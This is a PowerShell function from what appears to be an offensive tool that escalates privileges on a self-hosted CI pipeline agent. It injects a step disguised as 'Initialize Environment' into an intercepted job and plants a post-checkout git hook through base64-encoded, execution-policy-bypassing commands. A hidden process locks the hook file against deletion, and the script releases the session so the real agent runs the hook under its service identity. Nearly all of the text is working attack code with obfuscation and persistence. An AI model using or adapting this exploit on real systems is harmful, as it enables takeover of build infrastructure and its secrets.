# ── LPE: Self-Hosted Git Hook Injection ─────────────────────────
# Flow:
#   1. Build hook payload (MSYS2-compatible sh script)
#   2. Build plant script (PowerShell via EncodedCommand)
#   3. Insert CmdLine step at PROCESS of steps array (raw string) in cmdline.ps1
#   4. Spawn Agent.Worker.exe via anonymous pipes
#   5. Send modified job via wire protocol
#   6. Wait for hook file (120s timeout), kill worker
#   7. Delete session -- pipeline returns to queue
#   8. Real agent reconnects, checkout fires our hook
# ─────────────────────────────────────────────────────────────────
function Invoke-LpeSelfHosted {
    param(
        [hashtable]$AgentInfo,
        [hashtable]$Auth,
        [hashtable]$Session,
        [string]$HookCommand = ""
    )

    # ── Step 1: Per-run identifiers ──
    $markerGuid = [guid]::NewGuid().ToString()
    $markerTs   = Get-Date -Format "yyyyMMdd-HHmmss"

    # ── Step 2: Find workspace path ──
    $sourcesDir = $null
    $workBase = Join-Path $AgentInfo.AgentPath "_work"

    if (Test-Path $workBase) {
        foreach ($wd in (Get-ChildItem $workBase -Directory -ErrorAction SilentlyContinue | Sort-Object Name)) {
            $candidate = Join-Path $wd.FullName "s"
            if (Test-Path (Join-Path $candidate ".git")) {
                $sourcesDir = $candidate
                break
            }
        }
    }
    if (-not $sourcesDir) {
        $sourcesDir = Join-Path $workBase "1\s"
    }
    Write-Log "Workspace: $sourcesDir" -Severity Info

    # ── Step 3: MSYS2 path conversion ──
    $agentPathClean = $AgentInfo.AgentPath.TrimEnd('\')
    $msysAgentPath = "/" + $agentPathClean.Replace('\','/').Replace(':','').ToLower()

    # ── Step 4: CmdLine task reference ──
    # Try filesystem cache first, fallback to well-known ID
    $cmdLineRefId  = "d9bafed4-0b18-4f58-968d-86655b4d2ce9"
    $cmdLineRefVer = "2.268.0"
    $tasksDir = Join-Path $AgentInfo.AgentPath "_work\_tasks"
    $cmdLineDir = Get-ChildItem $tasksDir -Directory -Filter "CmdLine_$cmdLineRefId" -EA SilentlyContinue | Select-Object -First 1
    if ($cmdLineDir) {
        $verDir = Get-ChildItem $cmdLineDir.FullName -Directory -EA SilentlyContinue | Sort-Object Name -Descending | Select-Object -First 1
        if ($verDir) { $cmdLineRefVer = $verDir.Name }
    }
    Write-Log "CmdLine task: $cmdLineRefId v$cmdLineRefVer" -Severity Info

    # ── Step 5: Build hook payload (worker-attack.ps1 lines 1507-1517) ──
    # MSYS2-compatible sh script with LF line endings
    $hookShCmd = if ($HookCommand) {
        "cmd.exe //c `"$($HookCommand.Replace('"','\"'))`""
    } else {
        "cmd.exe //c `"whoami.exe > C:/temp/escalated_identity_$markerTs.txt 2>&1`""
    }

    # Hook content: user command + GUID file in _diag for RCE confirmation
    $hookContent = "#!/bin/sh`n" +
        "$hookShCmd`n" +
        "touch `"$msysAgentPath/_diag/pages/$markerGuid.log`" 2>/dev/null`n"

    $hookB64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($hookContent))

    # ── Step 6: Build plant script ──
    $hooksDir = "$sourcesDir\.git\hooks"
    $hookFilePath = "$hooksDir\post-checkout"

    # Background locker: holds hook file open (read lock), sleeps 24h
    $lockScript = "[IO.File]::Open('$hookFilePath','Open','Read','ReadWrite')|Out-Null;Start-Sleep 86400"
    $lockB64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($lockScript))

    # Plant script: create dir, write hook, spawn locker
    $psScript = "try { " +
        "`$d = '$hooksDir'; " +
        "if (!(Test-Path `$d)) { `$null = New-Item -ItemType Directory -Path `$d -Force }; " +
        "[IO.File]::WriteAllBytes(`"`$d\post-checkout`", [Convert]::FromBase64String('$hookB64')); " +
        "Start-Process powershell -WindowStyle Hidden -ArgumentList '-NoProfile -EncodedCommand $lockB64'" +
        " } catch { }"

    # Encode for -EncodedCommand (UTF-16LE Base64)
    $cmdB64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($psScript))
    $plantScript = "powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand $cmdB64"

    # JSON-escape the plant script
    $escapedPlant = $plantScript.Replace('\','\\').Replace('"','\"')

    Write-Detail "Target: $hookFilePath"
    Write-Detail "Hook:   $hookShCmd"

    # ── Step 7: Build CmdLine step JSON ──
    $plantStepJson = '{"type":"task",' +
        '"reference":{"id":"' + $cmdLineRefId + '","name":"CmdLine","version":"' + $cmdLineRefVer + '",' +
        '"buildConfig":"Default","contributionIdentifier":null,"contributionVersion":null},' +
        '"isServerOwned":true,' +
        '"id":"' + [guid]::NewGuid().ToString() + '",' +
        '"name":"CmdLine_hook",' +
        '"displayName":"Initialize Environment",' +
        '"continueOnError":true,' +
        '"inputs":{"script":"' + $escapedPlant + '"}}'

    # ── Step 8: Insert plant step into raw job JSON ──
    Write-Host ""
    Write-Log "Modifying intercepted pipeline job..." -Severity Info

    $jobJson = $Session.JobJson

    # Insert at the PROCESS of steps array (before checkout step)
    $idx = $jobJson.IndexOf('"steps":[')
    if ($idx -lt 0) {
        Write-Log "Cannot plant hook: steps array not found in job JSON" -Severity Fatal
    }
    $insertPos = $jobJson.IndexOf('[', $idx) + 1
    $before = $jobJson.Length
    $jobJson = $jobJson.Substring(0, $insertPos) + $plantStepJson + "," + $jobJson.Substring($insertPos)

    Write-Log "Hook step inserted before checkout ($before -> $($jobJson.Length) chars)" -Severity Success
    Write-Detail "Worker will be killed after hook is planted"

    # ── Step 9: Spawn Worker (worker-attack.ps1 lines 1757-1799) ──
    $workerExe = Join-Path $AgentInfo.AgentPath "bin\Agent.Worker.exe"
    if (-not (Test-Path $workerExe)) {
        Write-Log "Worker not found: $workerExe" -Severity Fatal
    }

    Write-Host ""
    Write-Log "Spawning worker via anonymous pipes..." -Severity Info

    try {
        # Agent -> Worker pipe (we write, worker reads)
        $pipeOut = New-Object System.IO.Pipes.AnonymousPipeServerStream(
            [System.IO.Pipes.PipeDirection]::Out,
            [System.IO.HandleInheritability]::Inheritable)

        # Worker -> Agent pipe (worker writes, we read)
        $pipeIn = New-Object System.IO.Pipes.AnonymousPipeServerStream(
            [System.IO.Pipes.PipeDirection]::In,
            [System.IO.HandleInheritability]::Inheritable)

        $outHandle = $pipeOut.GetClientHandleAsString()
        $inHandle  = $pipeIn.GetClientHandleAsString()

        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName         = $workerExe
        $psi.Arguments        = "spawnclient $outHandle $inHandle"
        $psi.UseShellExecute  = $false
        $psi.WorkingDirectory = Join-Path $AgentInfo.AgentPath "bin"

        $worker = [System.Diagnostics.Process]::Start($psi)
        Write-Log "Worker spawned: PID $($worker.Id)" -Severity Success

        # Release inherited client handles from our process
        $pipeOut.DisposeLocalCopyOfClientHandle()
        $pipeIn.DisposeLocalCopyOfClientHandle()
    } catch {
        Write-Log "Failed to create pipes / spawn worker: $($_.Exception.Message)" -Severity Fatal
    }

    # ── Step 10: Send job via wire protocol ──
    # Format: [Int32 messageType][Int32 bodyByteLen][UTF-16LE body]
    try {
        $bodyBytes = [Text.Encoding]::Unicode.GetBytes($jobJson)
        $pipeOut.Write([BitConverter]::GetBytes([int]1), 0, 4)
        $pipeOut.Write([BitConverter]::GetBytes([int]$bodyBytes.Length), 0, 4)
        $pipeOut.Write($bodyBytes, 0, $bodyBytes.Length)
        $pipeOut.Flush()
        Write-Log "Job sent to worker: $($bodyBytes.Length) bytes" -Severity Success
    } catch {
        Write-Log "Failed to write job to pipe: $($_.Exception.Message)" -Severity Fatal
    }

    # ── Step 11: Wait for hook file ──
    Write-Host ""
    Write-Log "Waiting for worker to create hook file..." -Severity Info

    $hookFound = $false
    $sw = [Diagnostics.Stopwatch]::StartNew()

    while ($sw.Elapsed.TotalSeconds -lt 120) {
        if ([IO.File]::Exists($hookFilePath)) {
            Write-Log "Hook file created: $hookFilePath" -Severity Success
            Write-Log "Background locker holds it open (delete-proof)" -Severity Success
            $hookFound = $true
            break
        }
        if ($worker.HasExited) {
            Write-Log "Worker exited (exit: $($worker.ExitCode))" -Severity Warning
            if ([IO.File]::Exists($hookFilePath)) {
                Write-Log "Hook file created (worker exited after step)" -Severity Success
                $hookFound = $true
            }
            break
        }
        Start-Sleep -Milliseconds 100
    }

    # ── Step 12: Kill Worker + cleanup pipes ──
    if (-not $worker.HasExited) {
        Write-Log "Killing worker (hook planted, releasing job back to real agent)..." -Severity Warning
        try { $worker.Kill() } catch {}
        Start-Sleep -Milliseconds 500
    }
    try { $pipeOut.Dispose() } catch {}
    try { $pipeIn.Dispose()  } catch {}

    if (-not $hookFound) {
        Write-Host ""
        Write-Host "  ============================================" -ForegroundColor Red
        Write-Host "   HOOK PLANT FAILED" -ForegroundColor Red
        Write-Host "  ============================================" -ForegroundColor Red
        Write-Host ""
        Write-Detail "Worker could not create hook file." "Yellow"
        Write-Detail "Check if .git exists at: $sourcesDir" "Yellow"
        Write-Detail "Check worker log in: $($AgentInfo.AgentPath)\_diag" "Yellow"
        return
    }

    # ── Step 13: Delete session ──
    Write-Host ""
    Write-Log "Deleting session so real agent can reconnect..." -Severity Info
    Remove-Session -ServerUrl $AgentInfo.ServerUrl -PoolId $AgentInfo.PoolId `
        -SessionId $Session.SessionId -ApiHeaders $Auth.ApiHeaders
    Write-Log "Session deleted" -Severity Success

    # ── Step 14: Success banner ──
    $plantedAt = Get-Date

    Write-Host ""
    Write-Host "  ============================================" -ForegroundColor Green
    Write-Host "   HOOK PLANTED + SESSION RELEASED" -ForegroundColor Green
    Write-Host "  ============================================" -ForegroundColor Green
    Write-Host ""
    Write-Detail "Hook:     $hookFilePath"
    Write-Detail "Lock:     background powershell process (24h)"
    Write-Detail "Cmd:      $hookShCmd"
    Write-Detail "GUID log: $($AgentInfo.AgentPath)\_diag\pages\$markerGuid.log"
    Write-Host ""
    Write-Host "  Flow:" -ForegroundColor Cyan
    Write-Detail "1. Real agent reconnects (creates new session)"
    Write-Detail "2. Job re-queued (was never reported complete)"
    Write-Detail "3. Checkout: git clean -ffdx (does NOT touch .git/hooks/)"
    Write-Detail "4. Checkout: git checkout fires our hook"
    Write-Detail "5. Hook runs as AGENT SERVICE IDENTITY" "Green"
    Write-Host ""

    # ── Step 15: Monitor for escalation ──
    $pagesDir    = Join-Path $AgentInfo.AgentPath "_diag\pages"
    $guidLogFile = Join-Path $pagesDir "$markerGuid.log"

    Write-Log "Monitoring for escalation `(10 min timeout`)..." -Severity Warning
    Write-Detail "GUID log: $guidLogFile" "DarkGray"
    Write-Detail "Ctrl+C to stop" "DarkGray"
    Write-Host ""

    try {
        $monSw = [Diagnostics.Stopwatch]::StartNew()
        $detectedVia = $null

        while ($monSw.Elapsed.TotalMinutes -lt 10) {
            if ([IO.File]::Exists($guidLogFile)) {
                $detectedVia = "GUID log ($markerGuid.log)"
                break
            }

            Start-Sleep -Seconds 3
        }

        if ($detectedVia) {
            Write-Host ""
            Write-Host "  ============================================" -ForegroundColor Green
            Write-Host "   ESCALATION CONFIRMED!" -ForegroundColor Green
            Write-Host "   Hook executed as AGENT SERVICE IDENTITY" -ForegroundColor Green
            Write-Host "  ============================================" -ForegroundColor Green
            Write-Host ""
            Write-Detail "Kill locker: Get-Process powershell | Where-Object {`$_.StartTime -gt `(Get-Date`).AddMinutes`(-30`)} | Stop-Process" "DarkGray"
        } else {
            Write-Log "Monitoring timed out `(10 min`). Check manually: Test-Path $markerFile" -Severity Warning
        }
    } catch {
        Write-Host ""
        Write-Log "Monitoring stopped." -Severity Info
    }
}
